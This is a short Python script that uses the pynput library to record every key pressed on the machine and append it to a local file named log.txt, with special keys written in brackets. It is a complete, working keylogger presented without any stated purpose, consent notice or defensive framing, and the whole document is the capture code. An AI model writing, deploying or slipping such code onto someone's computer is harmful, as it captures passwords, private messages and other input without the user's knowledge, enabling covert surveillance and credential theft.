from pynput import keyboard

# Log file where keystrokes will be recorded
LOG_PATH = "log.txt"

# This function handles key press events
def handle_key_press(key):
    try:
        # Try to write normal characters (letters, numbers, symbols)
        with open(LOG_PATH, "a") as log:
            log.write(key.char)
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open(LOG_PATH, "a") as log:
            if key == keyboard.Key.space:
                log.write(" ")
            elif key == keyboard.Key.enter:
                log.write("\n")
            elif key == keyboard.Key.tab:
                log.write("\t")
            else:
                # Write other special keys in brackets
                log.write(f"[{key.name}]")

# Set up the listener that keeps running in the background
if __name__ == "__main__":
    with keyboard.Listener(on_press=handle_key_press) as listener:
        listener.join()